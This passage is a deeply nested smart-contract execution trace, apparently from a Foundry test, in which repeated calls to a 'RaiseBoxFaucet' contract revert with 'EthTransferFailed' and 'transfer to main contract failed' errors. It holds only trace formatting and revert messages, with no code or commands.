    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
